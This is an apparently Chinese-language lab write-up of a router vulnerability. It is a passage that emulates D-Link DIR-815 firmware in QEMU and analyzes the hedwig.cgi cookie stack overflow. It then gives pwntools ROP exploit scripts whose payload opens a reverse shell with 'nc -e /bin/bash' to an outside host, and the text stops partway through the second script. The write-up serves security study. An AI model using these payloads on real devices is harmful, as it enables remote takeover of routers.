</span></span><span class="line"><span class="cl">./httpd -f http_conf</span></span></code></pre></div><p>其中<code>http_conf</code>配置文件：</p>
<pre tabindex="0"><code>Umask 026  
PIDFile /var/run/httpd.pid  
LogGMT On  #开启log  
ErrorLog /log #log文件  
Tuning  
{  
    NumConnections 15  
    BufSize 12288  
    InputBufSize 4096  
    ScriptBufSize 4096  
    NumHeaders 100  
    Timeout 60  
    ScriptTimeout 60  
}  
Control  
{  
    Types  
    {  
        text/html    { html htm }  
        text/xml    { xml }  
        text/plain    { txt }  
        image/gif    { gif }  
        image/jpeg    { jpg }  
        text/css    { css }  
        application/octet-stream { \* }  
    }  
    Specials  
    {  
        Dump        { /dump }  
        CGI            { cgi }  
        Imagemap    { map }  
        Redirect    { url }  
    }  
    External  
    {  
        /usr/sbin/phpcgi { php }  
    }  
}  
Server  
{  
    ServerName &#34;Linux, HTTP/1.1, &#34;  
    ServerId &#34;1234&#34;  
    Family inet  
    Interface eth0         #网卡  
    Address 192.168.100.2  #qemu ip  
    Port &#34;4444&#34;            #port 
    Virtual  
    {  
        AnyHost  
        Control  
        {  
            Alias /  
            Location /htdocs/web  
            IndexNames { index.php }  
            External  
            {  
                /usr/sbin/phpcgi { router\_info.xml }  
                /usr/sbin/phpcgi { post\_login.xml }  
            }  
        }  
        Control  
        {  
            Alias /HNAP1  
            Location /htdocs/HNAP1  
            External  
            {  
                /usr/sbin/hnap { hnap }  
            }  
            IndexNames { index.hnap }  
        }  
    }  
}</code></pre><p>上传到qemu：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">scp -r squashfs-root/ root@192.168.100.2:/root</span></span></code></pre></div><p>服务正常启动：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">curl</span> <span class="nl">http</span><span class="p">:</span><span class="c1">//192.168.100.2:4444/hedwig.cgi -v -X POST -H &#34;Content-Length: 8&#34; -b &#34;uid=zh&#34;
</span></span></span></code></pre></div><p><img loading="lazy" src="image-20221022125353861.png" alt="image-20221022125353861" srcset="image-20221022125353861.png?size=small, image-20221022125353861.png?size=medium 1.5x, image-20221022125353861.png?size=large 2x" data-title="image-20221022125353861" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>退出qemu的话要恢复下<code>etc</code>文件夹：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1">##!/bin/bash</span>
</span></span><span class="line"><span class="cl">rm -rf /etc
</span></span><span class="line"><span class="cl">mv /etc_bak/etc /etc
</span></span><span class="line"><span class="cl">rm -rf /etc_bak</span></span></code></pre></div><h2 id="分析" class="heading-element"><span>分析</span>
  <a href="#%e5%88%86%e6%9e%90" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>DIR-815，exp：https://www.exploit-db.com/exploits/33863</p>
<p>可以看到是cookie的输入有漏洞，</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl">    <span class="k">begin</span>
</span></span><span class="line"><span class="cl">      <span class="n">res</span> <span class="o">=</span> <span class="n">send_request_cgi</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;method&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;uri&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;/hedwig.cgi&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;cookie&#39;</span>   <span class="o">=&gt;</span> <span class="s2">&#34;uid=</span><span class="si">#{</span><span class="n">shellcode</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;encode_params&#39;</span> <span class="o">=&gt;</span> <span class="kp">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;vars_post&#39;</span> <span class="o">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">rand_text_alpha</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="n">rand_text_alpha</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">})</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">res</span>
</span></span><span class="line"><span class="cl">    <span class="k">rescue</span> <span class="o">::</span><span class="no">Rex</span><span class="o">::</span><span class="no">ConnectionError</span>
</span></span><span class="line"><span class="cl">      <span class="n">fail_with</span><span class="p">(</span><span class="no">Failure</span><span class="o">::</span><span class="no">Unreachable</span><span class="p">,</span> <span class="s2">&#34;</span><span class="si">#{</span><span class="n">peer</span><span class="si">}</span><span class="s2"> - Failed to connect to the web server&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">end</span></span></span></code></pre></div><p>ida查看cookie的字符串发现只有一处交叉引用，</p>
<p><img loading="lazy" src="image-20221022222144259.png" alt="image-20221022222144259" srcset="image-20221022222144259.png?size=small, image-20221022222144259.png?size=medium 1.5x, image-20221022222144259.png?size=large 2x" data-title="image-20221022222144259" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p><code>sess_get_uid</code>的交叉引用：</p>
<p><img loading="lazy" src="image-20221022222317647.png" alt="image-20221022222317647" srcset="image-20221022222317647.png?size=small, image-20221022222317647.png?size=medium 1.5x, image-20221022222317647.png?size=large 2x" data-title="image-20221022222317647" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>漏洞点就在<code>sess_get_uid</code>后面的<code>sprintf</code>，一共有两处，下面从main的头分析下：</p>
<p>首先判断请求的方式，必须是POST请求，之后走<code>cgibin_parse_request</code>函数：</p>
<p><img loading="lazy" src="image-20221022223442719.png" alt="image-20221022223442719" srcset="image-20221022223442719.png?size=small, image-20221022223442719.png?size=medium 1.5x, image-20221022223442719.png?size=large 2x" data-title="image-20221022223442719" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p><code>cgibin_parse_request</code>函数会取出来几个环境变量的值：<code>CONTENT_TYPE</code>，<code>CONTENT_LENGTH</code>，<code>REQUEST_URI</code>，这个函数之后再分析</p>
<p>接下来会执行<code>sess_get_uid</code>函数：</p>
<p>首先取出<code>HTTP_COOKIE</code>的值：</p>
<p><img loading="lazy" src="image-20221022223911324.png" alt="image-20221022223911324" srcset="image-20221022223911324.png?size=small, image-20221022223911324.png?size=medium 1.5x, image-20221022223911324.png?size=large 2x" data-title="image-20221022223911324" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>之后将等号前的值给v2：</p>
<p><img loading="lazy" src="image-20221022223936865.png" alt="image-20221022223936865" srcset="image-20221022223936865.png?size=small, image-20221022223936865.png?size=medium 1.5x, image-20221022223936865.png?size=large 2x" data-title="image-20221022223936865" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>其中<code>sobj_add_char(a1,a2)</code>是将a2前的值给a1：</p>
<p><img loading="lazy" src="image-20221022224045488.png" alt="image-20221022224045488" srcset="image-20221022224045488.png?size=small, image-20221022224045488.png?size=medium 1.5x, image-20221022224045488.png?size=large 2x" data-title="image-20221022224045488" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>以及将等号之后的值给v4：</p>
<p><img loading="lazy" src="image-20221022224204572.png" alt="image-20221022224204572" srcset="image-20221022224204572.png?size=small, image-20221022224204572.png?size=medium 1.5x, image-20221022224204572.png?size=large 2x" data-title="image-20221022224204572" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>再之后判断<code>v2</code>为<code>uid</code>的话将<code>UID</code>的值给<code>v8</code>，然后拼接到<code>a1</code>(也就是<code>main</code>中传进来的<code>v4</code>)</p>
<p><img loading="lazy" src="image-20221022224426492.png" alt="image-20221022224426492" srcset="image-20221022224426492.png?size=small, image-20221022224426492.png?size=medium 1.5x, image-20221022224426492.png?size=large 2x" data-title="image-20221022224426492" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>然后就是第一个栈溢出的点</p>
<p>之后是两个判断：</p>
<p><img loading="lazy" src="image-20221022224838974.png" alt="image-20221022224838974" srcset="image-20221022224838974.png?size=small, image-20221022224838974.png?size=medium 1.5x, image-20221022224838974.png?size=large 2x" data-title="image-20221022224838974" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>其中第一个判断要有<code>/var/tmp/</code>这个文件夹，第二个判断<code>haystack</code>在<code>cgibin_parse_request</code>的第一个参数可以操作：</p>
<p><img loading="lazy" src="image-20221022225102838.png" alt="image-20221022225102838" srcset="image-20221022225102838.png?size=small, image-20221022225102838.png?size=medium 1.5x, image-20221022225102838.png?size=large 2x" data-title="image-20221022225102838" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>也就是说要走到这里才可以(其中的a1就是<code>sub_409A6C</code>)，其中最早的有个判断<code>v9!=-1</code>，<code>CONTENT_TYPE</code>不能为空：</p>
<p><img loading="lazy" src="image-20221022225208255.png" alt="image-20221022225208255" srcset="image-20221022225208255.png?size=small, image-20221022225208255.png?size=medium 1.5x, image-20221022225208255.png?size=large 2x" data-title="image-20221022225208255" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p><code>cgibin_parse_request</code>函数首先获取几个值，其中<code>REQUEST_URI</code>不能为空：</p>
<p><img loading="lazy" src="image-20221022225442519.png" alt="image-20221022225442519" srcset="image-20221022225442519.png?size=small, image-20221022225442519.png?size=medium 1.5x, image-20221022225442519.png?size=large 2x" data-title="image-20221022225442519" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>后面还有个<code>sprintf</code>，其中的v4没有变过</p>
<p><img loading="lazy" src="image-20221022230300494.png" alt="image-20221022230300494" srcset="image-20221022230300494.png?size=small, image-20221022230300494.png?size=medium 1.5x, image-20221022230300494.png?size=large 2x" data-title="image-20221022230300494" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h2 id="exp" class="heading-element"><span>EXP</span>
  <a href="#exp" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>有两种方式，一种是将写好的payload放到qemu执行，还有一种是直接发送http请求。</p>
<h3 id="qemu执行exp" class="heading-element"><span>qemu执行exp</span>
  <a href="#qemu%e6%89%a7%e8%a1%8cexp" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>其中的test就是gdb的cyclic生成的字符串</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1">##!/bin/bash  </span>
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">CONTENT_TYPE</span><span class="o">=</span><span class="s2">&#34;application/x-www-form-urlencoded&#34;</span>  
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">HTTP_COOKIE</span><span class="o">=</span><span class="s2">&#34;uid=`cat test`&#34;</span>  
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">CONTENT_LENGTH</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> -n <span class="s2">&#34;</span><span class="nv">$HTTP_COOKIE</span><span class="s2">&#34;</span> <span class="p">|</span> wc -c<span class="k">)</span>  
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">REQUEST_METHOD</span><span class="o">=</span><span class="s2">&#34;POST&#34;</span>  
</span></span><span class="line"><span class="cl"><span class="nb">export</span> REQUEST<span class="se">\_</span>URI<span class="o">=</span><span class="s2">&#34;/hedwig.cgi&#34;</span>  
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;uid=1111&#34;</span><span class="p">|</span>./gdbserver.mipsle 192.168.111.131:6666 /htdocs/web/hedwig.cgi  
</span></span><span class="line"><span class="cl"><span class="c1">##echo &#34;uid=1111&#34;|/htdocs/web/hedwig.cgi</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">gdb-multiarch htdocs/cgibin
</span></span><span class="line"><span class="cl"><span class="nb">set</span> architecture mips
</span></span><span class="line"><span class="cl">target remote 192.168.100.2:6666
</span></span><span class="line"><span class="cl">b hedwigcgi_main
</span></span><span class="line"><span class="cl">b *0x409a50
</span></span><span class="line"><span class="cl">b *0x00409A28</span></span></code></pre></div><p>可以看到偏移为1009</p>
<p><img loading="lazy" src="image-20221022232531539.png" alt="image-20221022232531539" srcset="image-20221022232531539.png?size=small, image-20221022232531539.png?size=medium 1.5x, image-20221022232531539.png?size=large 2x" data-title="image-20221022232531539" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>重新写下看看偏移是否是1009：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1">##!/bin/bash  </span>
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">CONTENT_TYPE</span><span class="o">=</span><span class="s2">&#34;application/x-www-form-urlencoded&#34;</span>  
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">HTTP_COOKIE</span><span class="o">=</span><span class="k">$(</span>python -c <span class="s2">&#34;print &#39;uid=&#39; + &#39;A&#39;\*1009 + &#39;0000&#39;&#34;</span><span class="k">)</span>   
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">CONTENT_LENGTH</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> -n <span class="s2">&#34;</span><span class="nv">$HTTP_COOKIE</span><span class="s2">&#34;</span> <span class="p">|</span> wc -c<span class="k">)</span>  
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">REQUEST_METHOD</span><span class="o">=</span><span class="s2">&#34;POST&#34;</span>  
</span></span><span class="line"><span class="cl"><span class="nb">export</span> REQUEST<span class="se">\_</span>URI<span class="o">=</span><span class="s2">&#34;/hedwig.cgi&#34;</span>  
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;uid=1111&#34;</span><span class="p">|</span>./gdbserver.mipsle 192.168.111.131:6666 /htdocs/web/hedwig.cgi  
</span></span><span class="line"><span class="cl"><span class="c1">##echo &#34;uid=1111&#34;|/htdocs/web/hedwig.cgi</span></span></span></code></pre></div><p>可以看到确实是1009</p>
<p><img loading="lazy" src="image-20221022233231458.png" alt="image-20221022233231458" srcset="image-20221022233231458.png?size=small, image-20221022233231458.png?size=medium 1.5x, image-20221022233231458.png?size=large 2x" data-title="image-20221022233231458" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>libc基址：<code>0x77f34000</code></p>
<p><img loading="lazy" src="image-20221022233327357.png" alt="image-20221022233327357" srcset="image-20221022233327357.png?size=small, image-20221022233327357.png?size=medium 1.5x, image-20221022233327357.png?size=large 2x" data-title="image-20221022233327357" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p><img loading="lazy" src="image-20221022233947740.png" alt="image-20221022233947740" srcset="image-20221022233947740.png?size=small, image-20221022233947740.png?size=medium 1.5x, image-20221022233947740.png?size=large 2x" data-title="image-20221022233947740" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>其中的system，加上libc的base就是<code>0x767a8b200</code>，为了防止<code>00</code>，先减一，之后找个gadget加一就行</p>
<p><img loading="lazy" src="image-20221022234213409.png" alt="image-20221022234213409" srcset="image-20221022234213409.png?size=small, image-20221022234213409.png?size=medium 1.5x, image-20221022234213409.png?size=large 2x" data-title="image-20221022234213409" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>exp</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;mips&#39;</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">cmd</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;nc -e /bin/bash 192.168.111.138 8888&#39;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="mh">0x77f34000</span>
</span></span><span class="line"><span class="cl"><span class="n">system_addr_1</span> <span class="o">=</span> <span class="mh">0x53200</span> <span class="o">-</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="n">gadget1</span> <span class="o">=</span> <span class="mh">0x32A98</span>
</span></span><span class="line"><span class="cl"><span class="n">gadget2</span> <span class="o">=</span> <span class="mh">0x169C4</span>
</span></span><span class="line"><span class="cl"><span class="c1">##.text:000169C4                 addiu   $s2, $sp, 0x170+var_158//0x18</span>
</span></span><span class="line"><span class="cl"><span class="c1">##.text:000169C8                 move    $a2, $v1</span>
</span></span><span class="line"><span class="cl"><span class="c1">##.text:000169CC                 move    $t9, $s0</span>
</span></span><span class="line"><span class="cl"><span class="c1">##.text:000169D0                 jalr    $t9 ; mempcpy</span>
</span></span><span class="line"><span class="cl"><span class="c1">##.text:000169D4                 move    $a0, $s2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">973</span> 							<span class="c1"># 1009-4*9</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">system_addr_1</span><span class="p">)</span> 	<span class="c1"># s0  system_addr- 1</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">gadget2</span><span class="p">)</span> 		<span class="c1"># s1  </span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mi">4</span><span class="o">*</span><span class="mi">7</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">gadget1</span><span class="p">)</span> 		<span class="c1"># ra  addiu $s0, 1 ; jalr $s1</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x18</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">cmd</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">fd</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;test&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">fd</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">fd</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></span></span></code></pre></div><p>exp2:</p>
<p>这个就是https://www.exploit-db.com/exploits/33863改的</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;mips&#39;</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">cmd</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;nc -e /bin/bash 192.168.111.138 8888&#39;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="mh">0x77f34000</span>
</span></span><span class="line"><span class="cl"><span class="n">system_addr_1</span> <span class="o">=</span> <span class="mh">0x53200</span> <span class="o">-</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="n">gadget1</span> <span class="o">=</span> <span class="mh">0x00158C8</span>
</span></span><span class="line"><span class="cl"><span class="c1">##.text:000158C8                 move    $t9, $s5</span>
</span></span><span class="line"><span class="cl"><span class="c1">##.text:000158CC                 jalr    $t9</span>
</span></span><span class="line"><span class="cl"><span class="c1">##.text:000158D0                 addiu   $s0, 1</span>
</span></span><span class="line"><span class="cl"><span class="n">gadget2</span> <span class="o">=</span> <span class="mh">0x000159CC</span>
</span></span><span class="line"><span class="cl"><span class="c1">##.text:000159CC                 addiu   $s5, $sp, 0x14C+var_13C</span>
</span></span><span class="line"><span class="cl"><span class="c1">## ......</span>
</span></span><span class="line"><span class="cl"><span class="c1">##.text:000159D8                 move    $t9, $s0</span>
</span></span><span class="line"><span class="cl"><span class="c1">##.text:000159DC                 jalr    $t9 ; mempcpy</span>
</span></span><span class="line"><span class="cl"><span class="c1">##.text:000159E0                 move    $a0, $s5</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">973</span> 							<span class="c1"># 1009-4*9</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">system_addr_1</span><span class="p">)</span> 	<span class="c1"># s0  system_addr- 1</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mi">4</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span>						<span class="c1"># $s1 - $s4</span>
